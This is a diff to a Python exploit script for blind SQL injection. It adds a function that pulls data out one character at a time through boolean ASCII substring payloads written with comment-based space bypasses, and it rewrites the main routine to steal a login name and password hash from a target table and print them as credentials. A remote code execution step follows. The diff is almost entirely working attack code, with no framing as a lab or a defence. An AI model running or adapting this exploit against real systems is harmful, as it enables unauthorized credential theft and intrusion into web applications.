@@ -46,7 +46,7 @@ def send_get(url, debug):
     return r
 
 
-def blind_inject(inj_str):
+def prepare_sqli_request(inj_str):
     for j in range(32, 126): # printable ascii range
         # now we update the payload with the character we are testing for
         inj_str_ = inj_str.replace("[CHAR]", str(j))
@@ -57,6 +57,24 @@ def blind_inject(inj_str):
         if (content_length > 20):
             return j
     return None
+
+
+def inject(r, inj):
+    extracted = ""
+    for i in range(1, r):
+        # modify injection_string based on the vulnerable endpoint requirements
+        injection_string = f"test'/**/or/**/(ascii(substring(({inj}),{i},1)))=[CHAR]/**/or/**/1='"
+        retrieved_value = prepare_sqli_request(injection_string)
+        if (retrieved_value):
+            extracted += chr(retrieved_value)
+            extracted_char = chr(retrieved_value)
+            sys.stdout.write(extracted_char)
+            sys.stdout.flush()
+        else:
+            print()
+            output.success("Done!")
+            break
+    return extracted
 
 
 def main():
@@ -93,22 +111,15 @@ def main():
     else:
         output.warning("No SQLi detected.") 
         sys.exit(-1)
-
-    user = ""
-    output.info("Extracting current user")
     
-    # Example extracting DB user
-    for i in range(1, 17): # assuming user is no more than 16 chars
-        injection_string = f"test')/**/or/**/(ascii(substring((select/**/user()),{i},1)))=[CHAR]%23"
-        extracted_char = blind_inject(injection_string)
-        if extracted_char == 64: # stop extracting when we hit the @ char as we don't want the host
-            output.success("\nCurrent user extraction complete.")
-            break
-        else:
-            extracted_char = chr(extracted_char)
-            user = user + extracted_char
-            sys.stdout.write(extracted_char)
-            sys.stdout.flush()
+    # Modify the injection queries and r range based on expected output length
+    output.info("Retrieving username....")
+    query = "select/**/login/**/from/**/<TABLE>/**/LIMIT/**/1"
+    username = inject(50, query)
+    output.info("Retrieving password hash....")
+    query = "select/**/password/**/from/**/<TABLE>/**/LIMIT/**/1"
+    password = inject(50, query)
+    output.success(f"Credentials: {username} / {password}")
 
     # Remote Code Execution
     send_get(f"http://{args.target}", args.debug)
